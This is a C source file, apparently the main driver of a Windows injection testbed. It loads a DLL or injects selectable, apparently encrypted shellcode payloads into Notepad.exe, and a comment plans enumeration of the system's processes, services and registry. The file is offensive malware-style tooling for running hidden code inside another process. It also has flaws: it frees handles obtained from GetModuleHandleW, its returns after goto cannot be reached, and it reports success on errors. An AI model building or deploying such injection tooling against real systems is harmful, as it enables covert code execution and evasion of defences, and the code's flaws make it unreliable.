#include <stdio.h>
#include <windows.h>

// Headers
#include "../Headers/info.h"
#include "../Headers/config.h"
#include "../Headers/hashtable.h"
#include "../Headers/enumeration.h"
#include "../Headers/error.h"

// Payloads
#include "payloads.h"

// Injection methods
#include "dll_injection.h"
#include "remote_shellcode.h"
#include "remote_mapping.h"

// For now, the target process will be notepad.exe
// This will be changed in the future to be user defined.
#define TARGET_PROCESS "Notepad.exe"
#define TARGET_DLL L"dll\\injectDll.dll"

/*
The idea of this program is to be able to choose injection methods to test with various payloads. 
The payloads will be encrypted using different encryption methods.
The program will also enumerate the system to gather information about the OS, processes, services, and registry keys.
*/

int main(int argc, char *argv[]) {

    // Early failure checks && help
    if (argc < 2) {
        defaultHelp(&argv[0]);
        return 1;
    } else if (strcmp(argv[1], "--help") == 0 && argc == 2) {
        defaultHelp(&argv[0]);
        return 0;
    } else if (strcmp(argv[1], "--help") == 0 && argc > 2) {
        if (strcmp(argv[2], "injection") == 0) {
            injectionMethodsHelp();
        } else if (strcmp(argv[2], "payload") == 0) {
            payloadsHelp();
        } else {
            defaultHelp(&argv[0]);
        }
        return 0;
    }

    // Init handle variables.
    HMODULE hNTDLLMoudle = NULL;
    HMODULE hKernel32Module = NULL;
    
    // Parse the arguments
    config config;
    ZeroMemory(&config, sizeof(config));
    parseArguments(argc, argv, &config);

    // Print the configuration. For debugging purposes.
    printConfig(&config);

    hNTDLLMoudle = GetModuleHandleW(L"ntdll.dll");
    if (!hNTDLLMoudle) {
        handleError(ERROR_INVALID_MODULE, "Failed to get module handle ntdll.dll");
        goto Cleanup;
        return 1;
    } 

    hKernel32Module = GetModuleHandleW(L"kernel32.dll");
    if (!hKernel32Module) {
        handleError(ERROR_INVALID_MODULE, "Failed to get module handle kernel32.dll");
        goto Cleanup;
        return 1;
    }

    // Until further notice, the target process will be notepad.exe
    // Also, this option way sucks and will be changed.
    // Not every injection method will need a payload (some use DLLs), 
    if (strcmp(config.injectionMethod, "rdll") == 0) {
        if (!runDLLInjection(TARGET_PROCESS, hKernel32Module, TARGET_DLL)) {
            handleError(ERROR_INVALID_INJECTION, "Failed to run DLL injection");
            goto Cleanup;
            return 1;
        }
    } else if (strcmp(config.injectionMethod, "rsc") == 0) {
        configMap* payload = getPayload(config.payload);
        if (!payload) {
            handleError(ERROR_INVALID_PAYLOAD, "Invalid payload");
            goto Cleanup;
            return 1;
        }
        if (!runShellcodeInjection(TARGET_PROCESS, (PBYTE)payload->payload, payload->payloadSize)) {
            handleError(ERROR_INVALID_INJECTION, "Failed to run shellcode injection");
            goto Cleanup;
            return 1;
        }
    } else {
        handleError(ERROR_INVALID_INJECTION, "Invalid injection method");
        goto Cleanup;
        return 1;
    }

    Cleanup:
        if (hNTDLLMoudle) {FreeLibrary(hNTDLLMoudle);}
        if (hKernel32Module) {FreeLibrary(hKernel32Module);}

        return 0;
}
